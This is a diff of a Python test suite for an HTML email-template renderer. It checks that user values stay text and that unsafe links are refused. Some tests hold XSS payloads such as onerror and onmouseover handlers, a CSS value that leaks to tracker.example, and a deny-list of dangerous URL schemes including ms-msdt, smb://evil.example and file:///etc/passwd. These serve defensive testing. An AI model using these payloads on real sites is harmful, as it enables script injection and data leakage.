-@example(head="", tail="", before="", block="<p>Hi</p><style>", after="Hello {{ v }}, welcome.", value=CSS)
-@example(head="", tail="", before="", block="<p>Hi</p><style/>", after="<p>Hello {{ v }}, welcome.</p>", value=CSS)
-@example(head="<p>Hi</p><style/>", tail="", before="", block="", after="<p>Hello {{ v }}, welcome.</p>", value=CSS)
+         value=JAVASCRIPT,
+         family=None, family_value=False)
+@example(head="", tail="", before="", block="<p>Hi</p><style>", after="Hello {{ v }}, welcome.", value=CSS,
+         family=None, family_value=False)
+@example(head="", tail="", before="", block="<p>Hi</p><style/>", after="<p>Hello {{ v }}, welcome.</p>", value=CSS,
+         family=None, family_value=False)
+@example(head="<p>Hi</p><style/>", tail="", before="", block="", after="<p>Hello {{ v }}, welcome.</p>", value=CSS,
+         family=None, family_value=False)
 @example(head="", tail="", before='<title>Hi</title{{ v }}><img alt={{ v }} src="https://example.test/x.png"></title>',
-         block="", after="<p>Body</p>", value="/ onerror=alert(1)")
+         block="", after="<p>Body</p>", value="/ onerror=alert(1)",
+         family=None, family_value=False)
 @example(head="", tail="", before='<p style="color:{{ brand.light.text }}">x</p><p style="\x000{{ v }}">y</p>',
-         block="", after="", value=";background-image:url(https://tracker.example/leak)")
+         block="", after="", value=";background-image:url(https://tracker.example/leak)",
+         family=None, family_value=False)
 def test_a_value_never_becomes_markup(
     kit: Any, head: str, tail: str, before: str, block: str, after: str, value: str,
+    family: tuple[dict[str, str], str] | None, family_value: bool,
 ) -> None:
     """Property 1, over the rows the walk admits, read as a browser reads them (html5lib).
 
     The rows meet as a layout around a template and a template around an included block, each drawn from tags in
     every quoting, spelling and whitespace of their attributes, self-closing and raw-text elements, comments,
-    declarations, entities and template code, ending anywhere.
+    declarations, entities and template code, ending anywhere. Half the compositions put one of the
+    :data:`FAMILIES` the closed lists refuse in place of the parts it names, half of those with the value that shows
+    what it would break, so that dropping any rule admits a break the generated examples alone find.
     """
 
+    if family is not None:
+        overrides, shown = family
+        parts = {"head": head, "tail": tail, "before": before, "block": block, "after": after, **overrides}
+        head, tail, before, block, after = (parts[name] for name in ("head", "tail", "before", "block", "after"))
+        value = shown if family_value else value
     template = _unsaved(
         format="html", source=before + '{% include "blocks/probe" with v=v only %}' + after, text_source="{{ v }}",
         variables={"v": "x"}, layout="probe",
@@ -1140,14 +1378,123 @@ def test_a_value_never_becomes_markup_through_any_filter(plain: Any, kit: Any, v
         _assert_value_stays_text(marker, rendered.html, str(candidate))
 
 
+TRUNCATING_SENDER = "x onmouseover=alert(document.domain) style=background:url(https://tracker.example/leak);x:"
+
+
+def test_a_cut_line_break_is_refused_since_markup_is_the_last_filter(plain: Any, kit: Any) -> None:
+    """linebreaksbr then truncatechars cut a <br> open and the next output became an attribute: refused, as is a
+    markup filter's output handed to a filter through with, an include argument or a test."""
+
+    del plain
+    source = "<p>{{ message|linebreaksbr|truncatechars:200 }} — {{ sender }}</p>"
+    row = _unsaved(format="html", source=source, text_source="{{ message }} {{ sender }}",
+                   variables={"message": "x", "sender": "x"})
+    rule = "linebreaksbr writes markup, so it is the last filter of a printed value"
+    assert any(rule in refusal for refusal in _refusals(row)), _refusals(row)
+    for bound in (
+        "{% with b=message|linebreaksbr %}<p>{{ b|truncatechars:9 }}{{ sender }}</p>{% endwith %}",
+        '{% include "blocks/cut" with body=message|linebreaksbr only %}{{ sender }}',
+        "{% if message|linebreaksbr %}<p>{{ sender }}</p>{% endif %}",
+    ):
+        row = _unsaved(format="html", source=bound, text_source="x", variables={"message": "x", "sender": "x"})
+        rows = _Rows(row, _unsaved("block", "cut", source="<p>{{ body|truncatechars:9 }}</p>", text_source="x",
+                                   variables={"body": "x"}))
+        refusals = TemplateWalker(saving=True).judge(row, rows).refusals
+        assert any(rule in refusal for refusal in refusals), (bound, refusals)
+    admitted = _mail("<p>{{ message|linebreaksbr }} — {{ sender }}</p>", {"message": "x", "sender": "x"},
+                     format="html", text_source="{{ message }} {{ sender }}")
+    html = _render(admitted, {"message": "a" * 196 + "\nx", "sender": TRUNCATING_SENDER}, kit).html
+    assert "<br>x — x onmouseover=alert(document.domain)" in html
+
+
+def test_only_a_markup_filter_returns_markup(plain: Any, kit: Any) -> None:
+    """A filter's result is escaped though Django's filter hands on a safe input, marks its own result safe or returns
+    its literal argument; a literal printed alone holds no <, > or "."""
+
+    del plain
+    template = _mail(
+        "<p>{{ v|default:'Q&A'|lower }}|{{ n|floatformat }}|{{ v|default:'a&amp;b' }}|{{ 'Q&A' }}</p>",
+        {"v": "x", "n": "x"}, format="html", text_source="x",
+    )
+    html = _render(template, {"v": "", "n": 1.5}, kit).html
+    assert "<p>q&amp;a|1.5|a&amp;amp;b|Q&A</p>" in html
+    assert any("holds <, > or" in refusal for refusal in _refusals(_unsaved(
+        format="html", source="<p>{{ '<b>' }}</p>", text_source="x")))
+
+
+CHAIN_FILTERS = [
+    "default:'d'", "upper", "lower", "capfirst", "title", "truncatechars:9", "truncatechars:10", "truncatechars:11",
+    "truncatewords:2", "linebreaksbr", "length", "floatformat", "pluralize", "yesno:'a,b'",
+]
+"""Every filter that reads a string, with arguments that cut where linebreaksbr writes <br>."""
+CHAIN_MESSAGES = ["aaaaaa\nbb cc", "aaaaaaa\nbb", "aaaaaaaa\nb", "&<>\"'\n\n", "a\n\n\nb", "1.5\n2"]
+CHAIN_PLACES = [
+    "<p>{chain} {{{{ s }}}}</p>", '<p title="{chain}">{{{{ s }}}}</p>', "<title>{chain} {{{{ s }}}}</title><p>x</p>",
+]
+
+
+@pytest.mark.parametrize("longest", [2, pytest.param(3, marks=pytest.mark.skipif(
+    not TIMED_RUN, reason="chains of three take a minute; ANGEE_TIMED_TESTS=1 runs them"))])
+def test_no_chain_of_filters_lets_a_value_become_markup(kit: Any, longest: int) -> None:
+    """Every chain of up to ``longest`` filters, in text, a double-quoted attribute and a title, before a hostile
+    value, read as a browser reads it: the value stays text whatever the chain did to the message before it."""
+
+    admitted = compared = 0
+    for size in range(1, longest + 1):
+        for chain in itertools.product(CHAIN_FILTERS, repeat=size):
+            output = "{{ m|" + "|".join(chain) + " }}"
+            for place in CHAIN_PLACES:
+                template = _unsaved(format="html", source=place.format(chain=output), text_source="x",
+                                    variables={"m": "x", "s": "x"}, layout="plain")
+                rows = _Rows(template, _unsaved("layout", "plain", source=PLAIN_LAYOUT, text_source=PLAIN_TEXT))
+                try:
+                    walk = TemplateWalker(saving=True).walk(template, rows)
+                except ValidationError:
+                    continue
+                admitted += 1
+                for message in CHAIN_MESSAGES:
+                    try:
+                        marker = walk.render({"m": message, "s": _harmless(TRUNCATING_SENDER)}, kit=kit).html
+                    except ValidationError:
+                        continue  # floatformat or pluralize refuses a message no float holds
+                    hostile = walk.render({"m": message, "s": TRUNCATING_SENDER}, kit=kit).html
+                    _assert_value_stays_text(marker, hostile, TRUNCATING_SENDER, scriptings=(False,))
+                    compared += 1
+    assert admitted and compared
+
+
+REFUSED_LINKS = (
+    "ms-msdt:/id PCWDiagnostic /skip force", "search-ms:query=x", "ms-officecmd:x", "ms-word:ofe|u|https://x.test/a",
+    "smb://evil.example/share", "intent://x#Intent;scheme=x;end", "chrome://settings", "view-source:https://x.test",
+    "blob:https://x.test/1", "filesystem:https://x.test/temporary/a", "mhtml:file://x", "res://x", "about:blank",
+    "jar:https://x.test!/", "feed:https://x.test", "cid:logo", "#top", "//evil.example/x", "/settings/forward",
+    "settings", "https:example.test", "https:///x", "https://", "http://?x", " javascript:x", "java\tscript:x",
+    "\x01javascript:x",
+)
+"""Links a value may not give: every scheme but the four, and every link a mail with no base cannot resolve."""
+ADMITTED_LINKS = {
+    "https://example.test/a?b=1&c=2": "https://example.test/a?b=1&amp;c=2",
+    "HTTPS://Example.test/": "HTTPS://Example.test/",
+    " http://example.test/x ": "http://example.test/x",
+    "https://example.test/café": "https://example.test/caf%C3%A9",
+    "https://bücher.example/a b": "https://xn--bcher-kva.example/a%20b",
+    "mailto:hello@example.test?subject=Hi there": "mailto:hello@example.test?subject=Hi%20there",
+    "tel:+1-555-0100": "tel:+1-555-0100",
+}
+"""Values url makes links of, percent-encoded and in punycode as markdown-it writes them, then escaped."""
+
+
 def test_a_url_value_gives_a_link_or_nothing(plain: Any, kit: Any) -> None:
-    """Property 3: unsafe schemes and every data: URL give an empty target; a quote cannot leave an attribute."""
+    """Property 3: a value gives an absolute https, http, mailto or tel link, or an empty target; a quote cannot
+    leave an attribute."""
 
     del plain
     template = _mail('<a href="{{ link|url }}">x</a>', {"link": "x"}, format="html", text_source="{{ link|url }}")
     for link in ("javascript:alert(1)", "JaVaScRiPt:alert(1)", "vbscript:x", "file:///etc/passwd",
-                 "data:text/html,x", "data:image/png;base64,AAAA", "https://" + "a" * 2_050):
+                 "data:text/html,x", "data:image/png;base64,AAAA", "https://" + "a" * 2_050, *REFUSED_LINKS):
         assert 'href=""' in _render(template, {"link": link}, kit).html, link
+    for link, sent in ADMITTED_LINKS.items():
+        assert f'href="{sent}"' in _render(template, {"link": link}, kit).html, link
     rendered = _render(template, {"link": 'https://example.test/" onclick="x'}, kit)
     marker = _render(template, {"link": MARKER}, kit).html
     _assert_value_stays_text(marker, rendered.html, 'https://example.test/" onclick="x')
@@ -1233,7 +1580,7 @@ def test_subject_preheader_and_plain_text(plain: Any, kit: Any) -> None:
 
     del plain
     template = _mail("Hi {{ name }}.", {"name": "x"}, subject="{{ name }}\nsecond line\tend",
-                     preheader="{{ name }}\r\nmore")
+                     preheader="{{ name }}\nmore")
     rendered = _render(template, {"name": "<b>Ana</b>"}, kit)
     assert rendered.subject == "<b>Ana</b> second line end" and rendered.preheader == "<b>Ana</b> more"
     assert "<title>&lt;b&gt;Ana&lt;/b&gt; second line end</title>" in rendered.html
@@ -1497,10 +1844,13 @@ def test_a_lone_surrogate_is_refused_as_invalid_values(plain: Any, kit: Any) -> 
 
 
 def test_the_deepest_admitted_row_and_values_render(plain: Any, kit: Any) -> None:
-    """Section 4: tags nested 16 deep, three includes, two loops and eight-segment paths reach no RecursionError."""
+    """Tags nested 16 deep, three includes, two loops, eight-segment paths and a condition of ten operators: the walk
+    and the render stay far under Python's default recursion limit, so no RecursionError, which stays unconverted,
+    can arise from a row."""
 
     del plain
-    nested = "\n".join(["{% if x %}"] * 16) + "{{ x }}" + "\n".join(["{% endif %}"] * 16)
+    condition = "{% if " + "not " * CONDITION_OPERATOR_LIMIT + "x %}"
+    nested = "\n".join(["{% if x %}"] * 15) + condition + "{{ x }}" + "\n".join(["{% endif %}"] * 16)
     _row("part", "depth3", source=nested, variables={"x": "x"})
     _row("part", "depth2", source='{% include "parts/depth3" with x=x only %}', variables={"x": "x"})
     _row("part", "depth1", source='{% include "parts/depth2" with x=x only %}', variables={"x": "x"})
@@ -1515,7 +1865,52 @@ def test_the_deepest_admitted_row_and_values_render(plain: Any, kit: Any) -> Non
     node = values
     for segment in deep.split("."):
         node = node.setdefault(segment, {}) if segment != "h" else node.setdefault(segment, "Eight")
-    assert _render(template, values, kit).plain_text.count("Deep") == 100
+    base = len(inspect.stack(0))
+    walked = _deepest(lambda: TemplateWalker(saving=True).walk(template, MessageTemplate.objects))
+    rendered = _deepest(lambda: _render(template, values, kit))
+    assert rendered[1].plain_text.count("Deep") == 100
+    added = max(walked[0], rendered[0]) - base
+    print(f"deepest admitted row: base {base} frames, walk {walked[0]}, render {rendered[0]}; "  # noqa: T201
+          f"adds {added}, {sys.getrecursionlimit() - base - added} under the limit of {sys.getrecursionlimit()}")
+    assert added < DEEPEST_ADDED_FRAMES
+
+
+DEEPEST_ADDED_FRAMES = 300
+"""The most Python frames the walk or the render of the deepest admitted row may add to its caller's."""
+
+
+def _deepest(call: Callable[[], Any]) -> tuple[int, Any]:
+    """The deepest Python stack ``call`` reaches, and what it returns."""
+
+    peak = [0]
+
+    def profile(frame: Any, event_name: str, argument: Any) -> None:
+        del argument
+        if event_name == "call":
+            depth = 0
+            while frame is not None:
+                depth, frame = depth + 1, frame.f_back
+            peak[0] = max(peak[0], depth)
+
+    with system_context(reason="tests.messaging_templates.render.depth"):
+        sys.setprofile(profile)
+        try:
+            result = call()
+        finally:
+            sys.setprofile(None)
+    return peak[0], result
+
+
+def test_a_condition_holds_at_most_ten_operators_each_a_node(plain: Any) -> None:
+    """A chain of 240 nots cost 575 frames and was counted as one node: now refused past ten, each operator counted."""
+
+    del plain
+    refused = _unsaved(source="{% if " + "not " * 240 + "x %}{% endif %}", variables={"x": "x"})
+    assert f"an if condition holds over {CONDITION_OPERATOR_LIMIT} operators" in " ".join(_refusals(refused))
+    admitted = _unsaved("part", "ops", source="{% if not a and b or c == 'x' %}{% endif %}",
+                        variables={"a": "x", "b": "x", "c": "x"})
+    walk = TemplateWalker(saving=True).judge(admitted, _Rows(admitted))
+    assert walk.refusals == []
 
 
 def test_an_over_long_subject_is_refused_by_its_column_and_never_lexed(
@@ -1549,7 +1944,7 @@ def test_subject_and_preheader_drop_control_and_bidirectional_characters(plain: 
     del plain
     template = _mail("Hi.", {"name": "x"}, subject="Hi {{ name }}", preheader="{{ name }}")
     rendered = _render(template, {"name": "a\x00b\x1b[1m\u202eevil\u202c\u2066x\u2069\x85c\x9fd\r\nBcc: e"}, kit)
-    assert rendered.subject == "Hi ab[1mevilx cd Bcc: e" and rendered.preheader == "ab[1mevilx cd Bcc: e"
+    assert rendered.subject == "Hi ab[1mevilxcd Bcc: e" and rendered.preheader == "ab[1mevilxcd Bcc: e"
 
 
 def test_the_plain_text_body_never_reads_the_subject_or_the_preheader(plain: Any) -> None:
@@ -1794,8 +2189,9 @@ def _deep_ifs(count: int) -> list[str]:
 
 
 DATED = [("{% with x=d|date:" + R20 + " %}{% endwith %}") * 10]
-CHAINS = ["{% if " + " or ".join(["x == y"] * 90) + " %}{% endif %}"] * 3
-"""Comparisons of two 10,000-character values that differ in their last character (the Django review's case)."""
+CHAINS = ["{% if " + " or ".join(["x == y"] * 5) + " %}{% endif %}"] * 30
+"""Comparisons of two 10,000-character values that differ in their last character (an earlier review's case), as many
+as the node cap admits now that each operator is a node: five to a condition, the most ten operators hold."""
 LINE = "{% for i in few %}{% with " + " ".join(f"v{index}=d|date:{R20}" for index in range(6)) + \
     " %}{% endwith %}{% endfor %}"
 """The costliest subject a 255-character column holds: six such dates an item, as many items as its pass allows."""
@@ -1838,7 +2234,8 @@ def _preview_cases() -> dict[str, Any]:
     10,000-character values and a third hidden row up to the walk's 150,000 characters, with the costliest
     subject its pass admits (50 items of six dates; the 500 list items are shared). ``review-subject``: the same
     with the review's subject over every item, which the subject's budget stops. ``refused``: a walk reaching
-    150,000 characters of ``*_`` rows whose HTML forms pass the text cap only when the walk is over.
+    150,000 characters of ``*_`` rows whose HTML forms pass the text cap only when the walk is over. ``headings``
+    and ``rules``: :data:`MULTIPLIED` rows, a template and two parts saved past their check.
     """
 
     star_lines = [("*_" * 499)[:999]] * 49
@@ -1848,6 +2245,8 @@ def _preview_cases() -> dict[str, Any]:
         _row("part", f"star{index}", source="\n".join([line[:996] for line in [*star_lines, star_lines[0]]]))
     for index in range(2):
         _row("part", f"hidden{index}", source=commented)
+        for name, multiplied in MULTIPLIED.items():
+            _row("part", f"{name}{index}", source=multiplied)
     hidden = '\n{% include "parts/hidden0" only %}{% include "parts/hidden1" only %}'
     loop = _loop(DATED + _deep_ifs(30))
     heavy = _loop(DATED + _deep_ifs(10) + CHAINS)
@@ -1876,7 +2275,32 @@ def _preview_cases() -> dict[str, Any]:
                          key="tests.refused"),
         "dated": _mail(_dated(0, 280), {"items.*.when": "x"}, format="html", text_source=_dated(300, 280),
                        key="tests.dated", sample=DATED_VALUES),
+        **{name: _mail(source + "".join(f'\n\n{{% include "parts/{name}{index}" only %}}' for index in range(2)),
+                       key=f"tests.{name}")
+           for name, source in MULTIPLIED.items()},
     }
+
+
+MULTIPLIED = {
+    "headings": "\n".join(["# a"] * 12_400)[:49_000],
+    "rules": "\n\n".join(["---"] * 9_800)[:49_000],
+}
+"""Markdown the pass multiplies: each heading or rule gains a styled tag, so a walk reaching three such rows of
+49,000 characters cost over two seconds before any cap applied. Each form is now refused at its own spans' cap."""
+
+
+def test_a_form_over_its_caps_is_refused_before_the_html_checks_read_it(
+    plain: Any, monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """The span and text caps meet a form straight after the Markdown pass: the HTML checks never read it."""
+
+    del plain
+    read: list[str] = []
+    _recording(monkeypatch, walker_module, "check_html", lambda form, *args, **kwargs: read.append(form))
+    for name, source in MULTIPLIED.items():
+        refusals = _refusals(_unsaved(source=source, key=f"tests.{name}"))
+        assert refusals == [f"tests.{name}: its html form holds over 2000 template spans"], refusals
+    assert read == []
 
 
 @pytest.fixture
@@ -1936,15 +2360,18 @@ PREVIEW_WORK: dict[str, tuple[int, list[tuple[str, int, int, int]], list[tuple[i
         [(0, 0, 0), (500, 15_936, 498_000), (498, 15_936, 498_000)],
     ),
     "review": (
-        149_981, [("html", 899, 4, 117), ("text", 882, 0, 15), ("subject", 8, 0, 0), LINES[1]],
-        [(50, 0, 30_000), (453, 6_750, 450_000), (450, 6_750, 450_000)],
+        149_981, [("html", 983, 4, 144), ("text", 966, 0, 42), ("subject", 8, 0, 0), LINES[1]],
+        [(50, 0, 30_000), (453, 18_900, 450_000), (450, 18_900, 450_000)],
     ),
     "review-subject": (
-        149_981, [("html", 899, 4, 117), ("text", 882, 0, 15), ("subject", 8, 0, 0), LINES[1]], [(51, 0, 30_000)],
+        149_981, [("html", 983, 4, 144), ("text", 966, 0, 42), ("subject", 8, 0, 0), LINES[1]], [(51, 0, 30_000)],
     ),
     "refused": (149_861, [("html", 19, 4, 498_344), ("text", 12, 0, 49_953), *LINES], []),
+    # Refused at the root's own check: its form holds over 2,000 spans, so no part is reached and nothing walked.
+    "headings": (49_076, [], []),
+    "rules": (49_068, [], []),
     "dated": (
-        23_322, [("html", 578, 284, 382), ("text", 568, 280, 281), *LINES], [(0, 0, 0), (500, 0, 0), (500, 0, 0)],
+        23_322, [("html", 579, 284, 382), ("text", 569, 280, 281), *LINES], [(0, 0, 0), (500, 0, 0), (500, 0, 0)],
     ),
 }
 """The work of the costliest previews: the walk's 150,000 characters, its caps, and every pass's budget."""
@@ -2004,7 +2431,8 @@ def test_pass_time(plain: Any, kit: Any, name: str) -> None:
 
 @TIMED
 def test_preview_time(plain: Any, kit: Any) -> None:
-    """The costliest previews and renders the caps admit take under two seconds of CPU: walk, prepare(), passes."""
+    """The costliest previews and renders the caps admit take under two seconds of CPU, and so do their walk and
+    prepare() alone; the refused cases stop as soon."""
 
     del plain
     spent: dict[str, float] = {}
@@ -2015,10 +2443,17 @@ def test_preview_time(plain: Any, kit: Any) -> None:
         spent[name] = round(time.process_time() - started, 3)
         assert (preview.rendered is not None) is (name in ADMITTED_PREVIEWS), preview.warnings
         if name in ADMITTED_PREVIEWS:
-            started = time.process_time()
             with system_context(reason="tests.messaging_templates.render.timed"):
+                started = time.process_time()
+                walk = TemplateWalker().walk(template, MessageTemplate.objects)
+                spent[f"{name} walk"] = round(time.process_time() - started, 3)
+                started = time.process_time()
+                with translation.override(walk.language):
+                    walk.prepare(template.sample)
+                spent[f"{name} prepare"] = round(time.process_time() - started, 3)
+                started = time.process_time()
                 template.render(template.sample, kit=kit)
-            spent[f"{name} render"] = round(time.process_time() - started, 3)
+                spent[f"{name} render"] = round(time.process_time() - started, 3)
     print(f"preview CPU {spent} load {os.getloadavg()[0]:.0f}")  # noqa: T201 -- the report quotes it
     assert max(spent.values()) < 2.0
 
@@ -2159,16 +2594,37 @@ mutation($id: String!, $set: message_templates_set_input!) {
   update_message_templates_by_pk(pk_columns: {id: $id}, _set: $set) { id }
 }
 """
+_INSERT = "mutation($object: message_templates_insert_input!) { insert_message_templates_one(object: $object) { id } }"
 _OVERRIDE = "mutation($id: ID!) { override_message_template(template: $id) { ok message id } }"
 _KEEP = "mutation($id: ID!) { keep_message_template_override(template: $id) { ok message id } }"
+
+
+def test_clean_refuses_a_number_in_variables_and_raises_nothing_else(plain: Any) -> None:
+    """clean() hashed a row before judging it walkable, so a NaN in variables raised ValueError, INTERNAL through the
+    console. It is judged first, and validate_variables refuses it: a description is words."""
+
+    del plain
+    for variables in ({"a": math.nan}, {"a": math.inf}, {"a": "x", "b": {"c": math.nan}}, {"a": 1}):
+        row = _unsaved("part", "nan", variables=variables)
+        with system_context(reason="tests.messaging_templates.render.clean"), pytest.raises(ValidationError) as raised:
+            row.full_clean()
+        assert list(raised.value.message_dict) == ["variables"], raised.value.message_dict
+    schema = addon_schema(messaging_templates_schema.schemas, "console")
+    own = _row("part", "own", source="x")
+    for user, code in ((create_platform_admin("messaging-templates-nan-admin"), "VALIDATION"),
+                       (create_user("messaging-templates-nan-member"), "PERMISSION_DENIED")):
+        result = execute_schema(schema, _UPDATE, {"id": public_id_of(own), "set": {"variables": {"a": math.nan}}},
+                                user=user)
+        assert [(error.extensions or {}).get("code") for error in result.errors or ()] == [code], result.errors
 
 
 def test_the_walk_runs_in_clean_after_the_permission_is_decided(
     plain: Any, kit: Any, monkeypatch: pytest.MonkeyPatch,
 ) -> None:
     """The three confirmations (probes j, b, b2): save() never walks; the console update, override, keep and
-    preview decide the caller's permission before anything is lexed or compiled. The console insert, which
-    validates before it decides create, is the framework's to fix."""
+    preview decide the caller's permission before anything is lexed or compiled, and so does the console insert,
+    whose write backend hands it to ``MessageTemplateManager.create_own``: a new language of a shipped row whose
+    walk refuses would be seeded from that row and walked, were create not decided first."""
 
     del plain, kit
     checked: list[str] = []
@@ -2187,12 +2643,15 @@ def test_the_walk_runs_in_clean_after_the_permission_is_decided(
     schema = addon_schema(messaging_templates_schema.schemas, "console")
     member = create_user("messaging-templates-writer")
     cases: dict[str, tuple[str, dict[str, Any]]] = {
+        "insert": (_INSERT, {"object": {"kind": "part", "key": "shipped", "language": "es", "name": "Spanish"}}),
         "update": (_UPDATE, {"id": public_id_of(own), "set": {"source": "{% if %} again"}}),
         "override": (_OVERRIDE, {"id": public_id_of(shipped)}),
         "keep": (_KEEP, {"id": public_id_of(own)}),
         "preview": (_PREVIEW, {"id": public_id_of(own), "kit": None}),
     }
     refusals = {
+        ("insert", "member"): ("PERMISSION_DENIED", "lacks 'create'"),
+        ("insert", "anonymous"): ("PERMISSION_DENIED", "lacks 'create'"),
         ("update", "member"): ("PERMISSION_DENIED", "cannot write"),
         ("update", "anonymous"): ("VALIDATION", "not found"),
         ("override", "member"): ("PERMISSION_DENIED", "lacks 'create'"),
@@ -2210,3 +2669,4 @@ def test_the_walk_runs_in_clean_after_the_permission_is_decided(
                 name, label, result.errors)
     with system_context(reason="tests.messaging_templates.render.save"):
         assert MessageTemplate.objects.get(pk=own.pk).source == "Still {% if %}"
+        assert not MessageTemplate.objects.filter(key="shipped", language="es").exists()
